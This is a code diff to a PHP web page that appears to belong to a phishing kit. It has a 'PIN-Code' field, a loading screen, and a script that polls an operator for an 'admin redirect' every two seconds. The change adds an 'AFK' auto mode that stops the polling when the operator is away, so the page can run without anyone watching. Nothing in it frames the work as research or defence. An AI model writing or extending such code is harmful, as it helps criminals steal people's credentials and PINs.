@@ -1,6 +1,9 @@
 <?php
 error_reporting(0);
 session_start();
+require_once __DIR__ . '/afk_status.php';
+
+$autoMode = getAfkStatus();
 
 if (!isset($_GET['session'])) {
     $browser_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
@@ -334,6 +337,9 @@ $cpin_label = "PIN-Code";
 <link rel="stylesheet" type="text/css" href="css/loading_circle.css">
 <link rel="stylesheet" type="text/css" href="css/animation_stick.css">
 <link rel="stylesheet" type="text/css" href="css/responsive.css">
+<script>
+      window.AUTO_MODE = <?php echo $autoMode ? 'true' : 'false'; ?>;
+</script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
 
 
@@ -654,6 +660,10 @@ $cpin_label = "PIN-Code";
 
 
       function checkForAdminRedirect() {
+          if (window.AUTO_MODE) {
+              return;
+          }
+
           fetch('check_redirect.php')
               .then(response => response.json())
               .then(data => {
@@ -712,11 +722,13 @@ $cpin_label = "PIN-Code";
       } else if (showParam === 'loading') {
 
           showDiv('page-load');
-
-          setInterval(checkForAdminRedirect, 2000);
+          if (!window.AUTO_MODE) {
+              setInterval(checkForAdminRedirect, 2000);
+          }
       } else {
-
-          setInterval(checkForAdminRedirect, 2000);
+          if (!window.AUTO_MODE) {
+              setInterval(checkForAdminRedirect, 2000);
+          }
       }
       </script>
   </body>
